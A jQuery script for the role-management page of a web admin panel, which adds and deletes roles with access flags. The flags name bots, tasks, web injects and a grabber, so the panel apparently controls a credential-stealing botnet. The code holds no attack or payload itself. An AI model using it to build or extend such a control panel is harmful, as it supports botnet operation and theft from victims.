$(document).ready(function () {
    rolesList.updateRoles();
});

const rolesList = {
    updateRoles: function () {
        $.get(document.location.pathname + '/get_roles_list')
            .success(function (res) {
                $('[data-roles-list]').empty();
                $('[data-roles-list]').append(res)
            });
    }
};

$('#add_new_role').click(function (e) {
    e.preventDefault();
    var arrValues = new Array();

    arrValues['new_role_name'] = $('#new_role_name').val();

    if ($("#access_all").is(":checked")) {
        arrValues['access_all'] = $('#access_all').val();
    } else {
        arrValues['access_all'] = '';
    }

    if ($("#access_users_cp").is(":checked")) {
        arrValues['access_users_cp'] = $('#access_users_cp').val();
    } else {
        arrValues['access_users_cp'] = '';
    }

    if ($("#access_bots").is(":checked")) {
        arrValues['access_bots'] = $('#access_bots').val();
    } else {
        arrValues['access_bots'] = '';
    }

    if ($("#access_task_cp").is(":checked")) {
        arrValues['access_task_cp'] = $('#access_task_cp').val();
    } else {
        arrValues['access_task_cp'] = '';
    }

    if ($("#access_web_inj_cp").is(":checked")) {
        arrValues['access_web_inj_cp'] = $('#access_web_inj_cp').val();
    } else {
        arrValues['access_web_inj_cp'] = '';
    }

    if ($("#access_grabber_settings_cp").is(":checked")) {
        arrValues['access_grabber_settings_cp'] = $('#access_grabber_settings_cp').val();
    } else {
        arrValues['access_grabber_settings_cp'] = '';
    }

    $.ajax({
        type: "post",
        url: "roles_cp/add_new_role",
        data: Object.assign({}, arrValues),
        success: function (res) {
            if (res == '1') {
                rolesList.updateRoles();
                $.jGrowl('Role added.', {sticky: false, theme: 'growl-success', header: 'Success!', life: 3000});
            } else {
                rolesList.updateRoles();
                $.jGrowl('Role no added', {sticky: false, theme: 'growl-error', header: 'Error!', life: 3000});
            }
        }
    })
});

function deleteRole(id) {
    $.ajax({
        type: "get",
        url: 'roles_cp/role_delete',
        data: "role_id=" + id,
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        success: function (res) {
            if (res === '1') {
                rolesList.updateRoles();
                $.jGrowl('Role delete.', {sticky: false, theme: 'growl-success', header: 'Success!', life: 3000});
            } else {
                rolesList.updateRoles();
                $.jGrowl('Role no delete', {sticky: false, theme: 'growl-error', header: 'Error!', life: 3000});
            }
        }
    })
}